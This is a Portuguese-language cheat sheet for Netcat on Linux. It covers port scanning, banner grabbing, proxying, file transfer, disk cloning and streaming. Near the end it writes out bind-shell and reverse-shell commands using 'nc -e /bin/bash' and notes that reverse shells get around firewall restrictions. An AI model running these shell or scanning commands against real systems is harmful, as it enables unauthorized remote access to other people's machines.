---
title: Netcat
date: 2020-11-25 18:28:43
background: bg-blue-600
tags:
  - ncat
  - nc
  - utility
  - network
  - traffic
categories:
  - Comandos Linux
intro: Este cheat sheet traz várias formas de usar o Netcat no Linux e no Unix.
plugins:
  - copyCode
---

## Primeiros passos {.cols-5}

### Uso {.col-span-2}

Conecte-se a um host em qualquer lugar

```shell script
$ nc [options] [host] [port]
```

Escute por conexões de entrada

```shell script
$ nc -lp port [host] [port]
```

### Exemplos de opções {.col-span-3 .row-span-2}

| Opção | Descrição                  | Exemplo                                      |
| ----- | -------------------------- | -------------------------------------------- |
| `-h`  | nc -h                      | Ajuda                                        |
| `-z`  | nc -z 192.168.1.9 1-100    | Scan de portas de um host ou endereço IP     |
| `-v`  | nc -zv 192.168.1.9 1-100   | Fornece saída verbosa                        |
| `-n`  | nc -zn 192.168.1.9 1-100   | Scan rápido desativando a resolução DNS      |
| `-l`  | nc -lp 8000                | Modo TCP Listen _(para conexões de entrada)_ |
| `-w`  | nc -w 180 192.168.1.9 8000 | Define o valor de timeout                    |
| `-k`  | nc -kl 8000                | Continua escutando após a desconexão         |
| `-u`  | nc -u 192.168.1.9 8000     | Usa UDP em vez de TCP                        |
| `-q`  | nc -q 1 192.168.1.9 8000   | Cliente permanece ativo após o EOF           |
| `-4`  | nc -4 -l 8000              | Apenas IPv4                                  |
| `-6`  | nc -6 -l 8000              | Apenas IPv6                                  |

### Chat cliente-servidor {.col-span-2}

Servidor (192.168.1.9)

```shell script
$ nc -lv 8000
```

Cliente

```shell script
$ nc 192.168.1.9 8000
```

## Exemplos do Netcat

### Banner grabbing

```shell script
$ nc website.com 80
GET index.html HTTP/1.1
HEAD / HTTP/1.1
```

ou

```shell script
echo "" | nc -zv -wl 192.168.1.1 801-805
```

### Scan de portas

Escaneia as portas entre 21 e 25

```shell script
$ nc -zvn 192.168.1.1 21-25
```

Escaneia as portas 22, 3306 e 8080

```shell script
$ nc -zvn 192.168.1.1 22 3306 8080
```

### Proxy e port forwarding

```shell script
$ nc -lp 8001 -c "nc 127.0.0.1 8000"
```

ou

```shell script
$ nc -l 8001 | nc 127.0.0.1 8000
```

Cria um túnel de uma porta local para outra

### Download de arquivo

Servidor (192.168.1.9)

```shell script
$ nc -lv 8000 < file.txt
```

Cliente

```shell script
$ nc -nv 192.168.1.9 8000 > file.txt
```

Suponha que você queira transferir um arquivo “file.txt” do servidor A para o cliente B.

### Upload de arquivo

Servidor (192.168.1.9)

```shell script
$ nc -lv 8000 > file.txt
```

Cliente

```shell script
$ nc 192.168.1.9 8000 < file.txt
```

Suponha que você queira transferir um arquivo “file.txt” do cliente B para o servidor A:

### Transferência de diretório

Servidor (192.168.1.9)

```shell script
$ tar -cvf – dir_name | nc -l 8000
```

Cliente

```shell script
$ nc -n 192.168.1.9 8000 | tar -xvf -
```

Suponha que você queira transferir um diretório pela rede de A para B.

### Transferência criptografada {.col-span-2}

Servidor (192.168.1.9)

```shell script
$ openssl enc -des3 -in file.txt -pass pass:password | nc -l 8000
```

Cliente

```shell script
$ nc 192.168.1.9 8000 | openssl enc -des3 -d -pass pass:password -out file.txt
```

Criptografe os dados antes de transferir pela rede

### Clonagem

Servidor (192.168.1.9)

```shell script
$ dd if=/dev/sda | nc -l 8000
```

Cliente

```shell script
$ nc -n 192.168.1.9 8000 | dd of=/dev/sda
```

Clonar um PC Linux é muito simples. Suponha que o disco do seu sistema seja /dev/sda

### Streaming de vídeo

Servidor (192.168.1.9)

```shell script
$ cat video.avi | nc -l 8000
```

Cliente

```shell script {.wrap}
$ nc 192.168.1.9 8000 | mplayer -vo x11 -cache 3000 -
```

Faz streaming de vídeo com o netcat

### Shell remoto

Servidor (192.168.1.9)

```shell script
$ nc -lv 8000 -e /bin/bash
```

Cliente

```shell script
$ nc 192.168.1.9 8000
```

Já usamos shell remoto com telnet e ssh, mas e se eles não estiverem instalados e não tivermos permissão
para instalá-los? Nesse caso, também podemos criar um shell remoto usando o netcat.

### Reverse shell

Servidor (192.168.1.9)

```shell script
$ nc -lv 8000
```

Cliente

```shell script
$ nc 192.168.1.9 8000 -v -e /bin/bash
```

Reverse shells costumam ser usados para contornar restrições de firewall, como conexões de entrada bloqueadas
